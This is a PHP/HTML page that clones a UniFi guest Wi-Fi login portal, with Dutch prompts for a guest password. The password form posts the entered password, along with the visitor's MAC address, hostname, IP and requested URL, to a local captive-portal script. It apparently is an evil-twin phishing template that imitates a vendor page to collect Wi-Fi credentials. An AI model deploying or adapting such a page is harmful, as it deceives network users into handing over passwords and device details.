<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>
<!DOCTYPE html>
<html lang="en" ng-controller="MainController as mainCtrl" class="ng-scope"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide{display:none !important;}ng\:form{display:block;}.ng-animate-block-transitions{transition:0s all!important;-webkit-transition:0s all!important;}.ng-hide-add-active,.ng-hide-remove{display:block!important;}</style>
    
    <title unifi-portal-custom-title=""></title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="msapplication-TileColor" content="#0193d7">
    <meta name="msapplication-TileImage" content="images/favicons/favicon-144.png">
    <link href="assets/style.css" rel="stylesheet">
    <link href="assets/style(1).css" rel="stylesheet">
    <link href="assets/app.css" rel="stylesheet">
    <script src="assets/config.js"></script>
    <script src="assets/vendor.js"></script>
    <script src="assets/components.js"></script>
    <script src="assets/main.js"></script>
  </head>
  <body unifi-portal-custom-body="" unifi-portal-custom-body-background-color="mainCtrl.getHotspotConfigModel().bg_color" unifi-portal-custom-body-background-image="mainCtrl.getHotspotConfigModel().getBgImageUrl()" unifi-portal-custom-body-background-image-tile="mainCtrl.getHotspotConfigModel().bg_image_tile" unifi-portal-rtl-support="" class="ng-isolate-scope" style="background-color: rgb(35, 48, 65); background-image: url(&quot;images/default/background.jpg&quot;); background-repeat: no-repeat; background-position: center center;">
    <!--[if lte IE 9]><div class="appOutdatedBrowserWarning is-warning-visible unifiPortalToastContainer"><![endif]-->
    <!--[if gt IE 9]><!-->
    <div class="unifiPortalOutdatedBrowserWarning unifiPortalToastContainer">
      <!--<![endif]-->
      <div class="unifiPortalToast unifiPortalToast--comfy unifiPortalToast--warning">
        <div class="unifiPortalToast__icon icon ubnt-icon--alert"></div>
        <div class="unifiPortalToast__content">
          <div class="unifiPortalToast__header">Outdated Browser</div>
          <div class="unifiPortalToast__body">
            <p class="noMarginBottom">
              You are using an <strong>outdated</strong> browser. Please
              <a href="http://browsehappy.com/">upgrade your browser</a>
              to improve your experience.
              
            </p>
          </div>
        </div>
      </div>
    </div>
    <div hey-toaster="" class="unifiPortalToastContainer ng-scope"></div>
    <!-- uiView:  --><div ui-view="" class="ng-scope">
<!-- uiView:  --><div ui-view="" class="ng-scope">
<div class="unifiPortalPage ng-scope">
  <div class="unifiPortalPage__centered unifiPortalGrid__container--responsive container--centered container--comfy">
    <div class="row row--comfy unifiPortalGrid__row--inline">
      <!-- ngIf: !!homeCtrl.hotspotConfigModel.getLogoUrl() || homeCtrl.isWelcomeTextEnabledAtPosition('under_logo') --><div ng-if="!!homeCtrl.hotspotConfigModel.getLogoUrl() || homeCtrl.isWelcomeTextEnabledAtPosition(&#39;under_logo&#39;)" class="col--xs12 col--md5 col--lg5 col--xlg5 col--lgOffset1 col--xlgOffset1 unifiPortalGrid__col--inline unifiPortalGrid__col--middle ng-scope">
        <!-- ngIf: !!homeCtrl.hotspotConfigModel.getLogoUrl() --><div ng-if="!!homeCtrl.hotspotConfigModel.getLogoUrl()" class="unifiPortalLogo ng-scope"><img ng-src="images/default/logo.svg" class="unifiPortalLogo__image" src="assets/logo.svg"></div><!-- end ngIf: !!homeCtrl.hotspotConfigModel.getLogoUrl() -->
        <!-- ngIf: homeCtrl.isWelcomeTextEnabledAtPosition('under_logo') && !homeCtrl.isProcessingOauthRequest() -->
        <!-- ngIf: homeCtrl.isProcessingOauthRequest() -->
      </div><!-- end ngIf: !!homeCtrl.hotspotConfigModel.getLogoUrl() || homeCtrl.isWelcomeTextEnabledAtPosition('under_logo') -->
      <!-- ngIf: !homeCtrl.isProcessingOauthRequest() --><div ng-if="!homeCtrl.isProcessingOauthRequest()" class="col--xs12 col--md7 col--lg5 col--xlg4 col--xlgOffset1 unifiPortalGrid__col--inline unifiPortalGrid__col--middle ng-scope">
        <div class="unifiPortalBoxGroup">
          <!-- ngIf: homeCtrl.isWelcomeTextEnabledAtPosition('above_boxes') -->
          <div unifi-portal-custom-box="" unifi-portal-custom-box-color="homeCtrl.hotspotConfigModel.text_color" class="unifiPortalBox unifiPortalBox__transparent unifiPortalBox__text ng-isolate-scope" style="color: rgb(255, 255, 255);">
            <!-- ngIf: homeCtrl.hotspotConfigModel.tos_enabled -->
          </div>
          <!-- ngIf: homeCtrl.hotspotConfigModel.languages.length > 0 --><div ng-if="homeCtrl.hotspotConfigModel.languages.length &gt; 0" class="unifiPortalBox unifiPortalBox__transparent unifiPortalBox__invisible ng-scope">
            <!-- ngIf: changeLanguageCtrl.hotspotConfigModel.languages.length > 1 --><div ng-if="changeLanguageCtrl.hotspotConfigModel.languages.length &gt; 1" ng-class="{&#39;unifiPortalLanguage--rtl&#39;: changeLanguageCtrl.isRtl()}" class="unifiPortalLanguage ng-scope" unifi-portal-change-language="">
  <!-- ngIf: !changeLanguageCtrl.isDisplayDropdown() --><div ng-if="!changeLanguageCtrl.isDisplayDropdown()" class="ng-scope"><!-- ngRepeat: language in changeLanguageCtrl.hotspotConfigModel.languages --><a ng-repeat="language in changeLanguageCtrl.hotspotConfigModel.languages" ng-click="changeLanguageCtrl.changeLanguage(language); $event.preventDefault()" href="http://192.168.2.96:8880/guest/s/default/?ap=78:8a:20:b6:14:4e&amp;ec=aukzD3FfVnEB6FggBV20DSE7lXp4ILtJIYKyLVWmThM0CYeVQdbKn0gbND_gXJZik88-tEKonPblOcLo9IRT2jQXngzGjar9Tb-JLd7Dd1T-xvwKA8RYKUOvczX1u93IxfvLplDU2Co_10vXgD7fPiudmyik1g2bxHniMps2SGFm6u5cWh66FTkQHUv7GEsp#index.php" ng-attr-title="{{changeLanguageCtrl.LANGUAGES[language]}}" class="unifiPortalLanguage__flagIcon flag-icon flag-icon-gb" title="English"></a><!-- end ngRepeat: language in changeLanguageCtrl.hotspotConfigModel.languages --><a ng-repeat="language in changeLanguageCtrl.hotspotConfigModel.languages" ng-click="changeLanguageCtrl.changeLanguage(language); $event.preventDefault()" href="http://192.168.2.96:8880/guest/s/default/?ap=78:8a:20:b6:14:4e&amp;ec=aukzD3FfVnEB6FggBV20DSE7lXp4ILtJIYKyLVWmThM0CYeVQdbKn0gbND_gXJZik88-tEKonPblOcLo9IRT2jQXngzGjar9Tb-JLd7Dd1T-xvwKA8RYKUOvczX1u93IxfvLplDU2Co_10vXgD7fPiudmyik1g2bxHniMps2SGFm6u5cWh66FTkQHUv7GEsp#index.php" ng-attr-title="{{changeLanguageCtrl.LANGUAGES[language]}}" class="unifiPortalLanguage__flagIcon flag-icon flag-icon-nl" title="Nederlands"></a><!-- end ngRepeat: language in changeLanguageCtrl.hotspotConfigModel.languages --></div><!-- end ngIf: !changeLanguageCtrl.isDisplayDropdown() --><!-- ngIf: changeLanguageCtrl.isDisplayDropdown() -->
</div><!-- end ngIf: changeLanguageCtrl.hotspotConfigModel.languages.length > 1 -->
          </div><!-- end ngIf: homeCtrl.hotspotConfigModel.languages.length > 0 -->
          <!-- ngIf: homeCtrl.isNoAuthenticationEnabled() -->
          <!-- ngIf: homeCtrl.isSimplePasswordAuthenticationEnabled() --><div ng-if="homeCtrl.isSimplePasswordAuthenticationEnabled()" unifi-portal-custom-box="" unifi-portal-custom-box-color="homeCtrl.hotspotConfigModel.box_text_color" unifi-portal-custom-box-background-color="homeCtrl.hotspotConfigModel.box_color" unifi-portal-custom-box-background-opacity="homeCtrl.hotspotConfigModel.box_opacity" class="unifiPortalBox ng-scope ng-isolate-scope" style="color: rgb(0, 0, 0); background-color: rgba(255, 255, 255, 0.9);">
            <h4 class="unifiPortalBox__header ng-binding">Gasten Toegang</h4>
            <form method="post" action="/captiveportal/index.php" novalidate="" autocomplete="off" name="homeCtrl.passwordForm" ng-class="{&#39;is-validation-hidden&#39;: !homeCtrl.showPasswordValidation}" class="ng-pristine ng-invalid ng-invalid-required is-validation-hidden"
                <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
                <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
                <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
                <input type="hidden" name="target" value="<?=$destination?>">
                <div class="unifiPortalFormGroup">
                <input type="password" name="password" placeholder="Voer het gasten wachtwoord in" required="" ng-model="homeCtrl.formModel.password" unifi-portal-backend-error-message-validator="InvalidPassword" class="input--full ng-pristine ng-invalid ng-invalid-required" autocomplete="off" style="background-image: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAASCAYAAABSO15qAAAAAXNSR0IArs4c6QAAAPhJREFUOBHlU70KgzAQPlMhEvoQTg6OPoOjT+JWOnRqkUKHgqWP4OQbOPokTk6OTkVULNSLVc62oJmbIdzd95NcuGjX2/3YVI/Ts+t0WLE2ut5xsQ0O+90F6UxFjAI8qNcEGONia08e6MNONYwCS7EQAizLmtGUDEzTBNd1fxsYhjEBnHPQNG3KKTYV34F8ec/zwHEciOMYyrIE3/ehKAqIoggo9inGXKmFXwbyBkmSQJqmUNe15IRhCG3byphitm1/eUzDM4qR0TTNjEixGdAnSi3keS5vSk2UDKqqgizLqB4YzvassiKhGtZ/jDMtLOnHz7TE+yf8BaDZXA509yeBAAAAAElFTkSuQmCC&quot;); background-repeat: no-repeat; background-attachment: scroll; background-size: 16px 18px; background-position: 98% 50%;">
                <div ng-show="homeCtrl.passwordForm.password.$error.required" class="unifiPortalInputFeedback unifiPortalInputFeedback--danger ng-binding">Wachtwoord is vereist.</div>
                <div ng-show="homeCtrl.passwordForm.password.$error.InvalidPassword" class="unifiPortalInputFeedback unifiPortalInputFeedback--danger ng-binding ng-hide">Onjuist wachtwoord</div>
              </div>
              <div class="unifiPortalFormFooter">
                <div class="unifiPortalFormFooter__right">
                  <button ng-disabled="homeCtrl.hotspotConfigModel.tos_enabled &amp;&amp; !homeCtrl.isTosAccepted()" ng-click="homeCtrl.showPasswordValidation = true" unifi-portal-custom-button="" unifi-portal-custom-button-background-color="homeCtrl.hotspotConfigModel.button_color" unifi-portal-custom-button-text-color="homeCtrl.hotspotConfigModel.button_text_color" busy-toggle="homeCtrl.isPasswordConnecting" busy-toggle-spinner-classes="[&#39;unifiPortalSpinner unifiPortalSpinner--light unifiPortalSpinner--centered&#39;]" class="unifiPortalMainButton unifiPortalMainButton--primary unifiPortalMainButton--responsive unifiPortalMainButton--steady ng-isolate-scope unifiPortalCustomButton busyToggle" style="background-color: rgb(19, 121, 183); border-color: rgb(18, 112, 171); color: rgb(255, 255, 255);"><div ng-hide="busySpinnerActive" ng-transclude="ng-transclude" class="busyToggle__body"><span class="ng-binding ng-scope">Verbinden</span></div><!-- ngIf: busySpinnerActive --></button>
                </div>
              </div>
            </form>
          </div><!-- end ngIf: homeCtrl.isSimplePasswordAuthenticationEnabled() -->
          <!-- ngIf: homeCtrl.isPaymentAuthenticationEnabled() -->
          <!-- ngIf: homeCtrl.isVoucherAuthenticationEnabled() -->
          <!-- ngIf: homeCtrl.isRadiusAuthenticationEnabled() -->
          <!-- ngIf: homeCtrl.isSocialAuthenticationEnabled() -->
          <!-- ngIf: homeCtrl.isFreeTrialAuthenticationEnabled() -->
        </div>
      </div><!-- end ngIf: !homeCtrl.isProcessingOauthRequest() -->
    </div>
  </div>
  <!-- ngIf: credentialsCtrl.hasUnsplashCredentialsVisible() -->
</div></div></div>
    <script src="assets/bootstrap.js"></script>
  
</body></html>